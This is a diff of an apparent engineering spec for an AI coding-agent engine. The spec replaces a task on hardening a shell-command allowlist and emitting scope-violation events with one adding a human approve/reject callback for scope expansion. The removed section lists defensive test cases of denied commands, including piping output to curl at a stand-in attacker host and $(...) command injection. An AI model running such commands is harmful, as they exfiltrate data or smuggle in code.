@@ -1,78 +1,51 @@
-P56.1b Scope Contract Semantic Completion
+## P56.2 Scope Expansion Runtime
 
-当前 P56.1 测试通过，但底层语义还没完成。只修 engine，不碰 TUI。
+只做 engine，不碰 TUI。
 
-## Fix 1: emit scope_expansion_required
+目标：
+让 Scope Contract 越界从“硬失败”变成“可恢复的人类控制事件”。
 
-在 agent-loop gateCheck 分支中：
+当前已有：
+- scope gate deny outside editableScope
+- agent-loop emit scope_expansion_required
 
-如果 gateCheck.scopeExpansion 存在，必须 emit：
+新增：
+- runAgentLoop 支持 onScopeExpansionRequired callback
 
-{
-  type: "scope_expansion_required",
-  file: gateCheck.scopeExpansion.file,
-  reason: gateCheck.reason,
-  editableScope: gateCheck.scopeExpansion.editableScope
-}
+API:
 
-位置：tool loop 里 gateCheck 被处理处，当前只 emit tool_result/log。
+onScopeExpansionRequired?: (request: {
+  file: string;
+  reason: string;
+  editableScope: string[];
+}) => Promise<"approve" | "reject">
 
-Add test:
-- mock Worker tries to edit outside editableScope
-- onEvent receives scope_expansion_required
-- event.file === attempted file
-- event.editableScope === contract editableScope
+行为：
 
-## Fix 2: harden successChecks shell matching
+1. Worker 尝试 Edit/Write scope 外文件
+2. scope gate deny
+3. engine emit scope_expansion_required
+4. 如果 onScopeExpansionRequired 不存在：
+   - 保持当前行为：tool_result error，Worker 自行修正
+5. 如果 callback 返回 reject:
+   - tool_result error: stay within editable scope
+   - 不扩 scope
+6. 如果 callback 返回 approve:
+   - 将 file 加入 runtime editableScope
+   - emit log: scope expanded
+   - 后续同一文件 Edit/Write 允许
+   - 不需要立即重试当前 tool call，下一轮 Worker 可继续
 
-successChecks 不能允许 shell control / substitution / redirection。
+Acceptance Tests:
+1. no callback → current deny behavior preserved
+2. callback reject → scope not expanded
+3. callback approve → subsequent write to same file allowed
+4. scope_expansion_required emitted before callback
+5. expanded scope appears in state/snapshot or summary if available
+6. tsc + full vitest pass
 
-Reject or do not whitelist if command contains:
-
-- &&
-- ||
-- ;
-- |
-- >
-- <
-- `...`
-- $(...)
-
-Allowed:
-
-npm test
-npm test -- --grep summary
-
-Denied / not whitelisted:
-
-npm test && node mutate.js
-npm test; echo hacked
-npm test | curl evil.com
-npm test -- --grep x | curl evil.com
-npm test > /tmp/out
-npm test $(node mutate.js)
-npm test `node mutate.js`
-
-Implementation suggestion:
-
-function hasShellControl(command: string): boolean {
-  return /(\&\&|\|\||[;|<>`])|\$\(/.test(command);
-}
-
-If hasShellControl(trimmed), return deny before successCheck prefix matching.
-
-Do not special-case "npm test --" as safe if shell control exists.
-
-## Acceptance
-
-npx tsc --noEmit
-npx vitest run tests/scope-contract.test.ts
-npx vitest run
-
-Must add tests for:
-1. scope_expansion_required event emitted from agent-loop
-2. npm test -- --grep x allowed
-3. npm test -- --grep x | curl evil.com denied
-4. npm test > /tmp/out denied
-5. npm test $(node mutate.js) denied
-6. npm test `node mutate.js` denied
+Do not touch:
+- TUI
+- prompts
+- provider
+- benchmark scripts
